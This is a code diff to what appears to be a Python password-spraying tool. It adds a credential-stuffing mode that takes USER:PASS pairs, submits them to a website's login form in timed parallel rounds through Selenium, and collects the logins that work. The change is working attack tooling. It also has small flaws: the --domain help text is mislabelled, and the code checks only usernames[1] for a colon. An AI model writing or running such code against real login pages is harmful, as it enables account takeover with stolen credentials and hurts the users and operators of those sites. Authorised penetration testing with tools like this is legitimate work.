@@ -45,7 +45,10 @@ def main(usernames="", passwords="", domain="", domain_after=False, url="", user
     # Prepare variables
     fail, success = prepare_success_fail(fail=fail, success=success)
     usernames = process_file(usernames)
-    passwords = process_file(passwords)
+    if passwords:
+        passwords = process_file(passwords)
+    else:
+        passwords = []
     usernames = prepare_usernames(usernames, domain, domain_after)
     url = prepare_url(url)
     invalid_username = prepare_invalid_username(invalid_username=invalid_username)
@@ -55,6 +58,9 @@ def main(usernames="", passwords="", domain="", domain_after=False, url="", user
                     fail=fail, success=success, threads=threads, delay=delay, username_field=username_field,
                     password_field=password_field, invalid_username=invalid_username)
 
+    if not passwords and ":" in usernames[1]:
+        credential_stuffing(usernames, url, fail, success, threads, delay, invalid_username, username_field_key, username_field_value, password_field_key, password_field_value, checkbox_key,
+     checkbox_value)
     # Loop through passwords
     password_id = 0
     while password_id < len(passwords):
@@ -98,15 +104,76 @@ def main(usernames="", passwords="", domain="", domain_after=False, url="", user
     print_ending()
 
 
+def credential_stuffing(usernames, url, fail, success, threads, delay, invalid_username, username_field_key,
+                        username_field_value, password_field_key, password_field_value, checkbox_key, checkbox_value):
+    credentials = []
+    for credential in usernames:
+        username = credential.split(":")[0]
+        password = credential.split(":")[1]
+        credentials.append({'USERNAME': username, 'PASSWORD': password, 'ATTEMPT': 0})
+
+    # Assign unique spray identifier
+    from collections import defaultdict
+    user_groups = defaultdict(list)
+    for d in credentials:
+        user_groups[d['USERNAME']].append(d)
+    for user, group in user_groups.items():  # Assigning sequential ATTEMPT values
+        for index, d in enumerate(group, start=1):
+            d['ATTEMPT'] = index
+    credentials = [d for group in user_groups.values() for d in group]  # Flatten the list
+
+    stuffing_attempt = 1
+    num_stuffing_attempts = max(d['ATTEMPT'] for d in credentials)
+    while stuffing_attempt <= num_stuffing_attempts:
+        next_start_time = datetime.now() + timedelta(minutes=delay)  # Check when the next spray should run
+        print(f"Beginning stuffing attempt {stuffing_attempt} of {num_stuffing_attempts}.")
+
+        # Spin up processes for each login attempt. Threads could have also been utilized, but Selenium is cleaner with
+        # individual processes.
+        manager = multiprocessing.Manager()
+        queue = manager.Queue()
+        with ProcessPoolExecutor(max_workers=threads) as executor:
+            for credential in credentials:
+                if credential['ATTEMPT'] == stuffing_attempt:
+                    processes = executor.submit(attempt_login,
+                                                queue=queue,
+                                                username=credential['USERNAME'],
+                                                password=credential['PASSWORD'],
+                                                url=url,
+                                                username_field_key=username_field_key,
+                                                username_field_value=username_field_value,
+                                                password_field_key=password_field_key,
+                                                password_field_value=password_field_value,
+                                                checkbox_key=checkbox_key,
+                                                checkbox_value=checkbox_value,
+                                                fail=fail,
+                                                success=success,
+                                                invalid_username=invalid_username)
+            processes.result()
+
+        # The credential stuffing attempts do not remove valid credentials from future sprays
+        credentials = process_queue(queue=queue, usernames=credentials)  # Retrieve results from the queue
+
+        # Check to see if the process is at the end. If not, wait the specified time.
+        if stuffing_attempt < (num_stuffing_attempts):
+            print(f"Stuffing attempt {stuffing_attempt} of {num_stuffing_attempts} complete. Waiting until "
+                  f"{next_start_time.strftime('%H:%M')} to start next spray.")
+            pause.until(next_start_time)
+        else:
+            print(f"Spray of password {stuffing_attempt} of {num_stuffing_attempts} complete. All passwords complete.")
+        stuffing_attempt += 1
+
+
 def process_queue(queue=None, usernames=None):
     if queue.empty():
         return usernames
-
-    global valid_credentials
     while not queue.empty():
         user = queue.get()
-        usernames.remove(user["USERNAME"])
+        for i in range(len(usernames) - 1, -1, -1):  # Loop in reverse to avoid index issues
+            if usernames[i]["USERNAME"] == user["USERNAME"]:
+                del usernames[i]
         if user["VALID"]:
+            global valid_credentials
             valid_credentials.append({"USERNAME": user["USERNAME"], "PASSWORD": user["PASSWORD"]})
 
     return usernames
@@ -168,12 +235,13 @@ def parse_arguments():
     required.add_argument('URL',
                           help="(REQUIRED) URL of the website to spray.")
     optional.add_argument("-d", "--domain",
-                          help="(OPTIONAL) Username or file with list of usernames to spray.")
+                          help="(REQUIRED) Username or file with list of usernames to spray. Alternatively, a list of "
+                               "usernames and passwords can be provided, seperated by a colon (e.g. USER:PASS)")
     optional.add_argument("-da", "--domain-after", action="store_true",
                           help="(OPTIONAL) Append domain to the end of the username (e.g. username@domain). By default,"
                                "the domain is placed before the username (e.g. domain/username).")
-    required.add_argument("-p", "--password", required=True,
-                          help="(REQUIRED) Password or file with list of usernames to spray.")
+    required.add_argument("-p", "--password",
+                          help="(OPTIONAL) Password or file with list of usernames to spray.")
     condition.add_argument('-f', '--fail',
                            help="(OPTIONAL) Text which will be on the page if authentication fails. -s can be used as "
                                 "an alternative.")
@@ -181,11 +249,11 @@ def parse_arguments():
                            help="(OPTIONAL) Text which will be on the page if authentication is successful. -f can be "
                                 "used as an alternative")
     required.add_argument("-u", "--username", required=True,
-                          help="(REQUIRED) Username or file with list of usernames to spray.")
+                          help="(REQUIRED) Username or file with list of usernames to spray. Alternatively, can be a"
+                               "list of colon-seperated credentials to spray (e.g. USER:PASS)")
     optional.add_argument("-i", "--invalid-username", type=str,
                           help="(OPTIONAL) String(s) to look for to determine if the username was invalid. Multiple "
                                "strings can be provided comma seperated with no spaces.")
-
     required.add_argument('-uf', '--username-field', required=True, type=str,
                           help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
                                "a username into. Can be found by inspecting the username field in your browser. For"
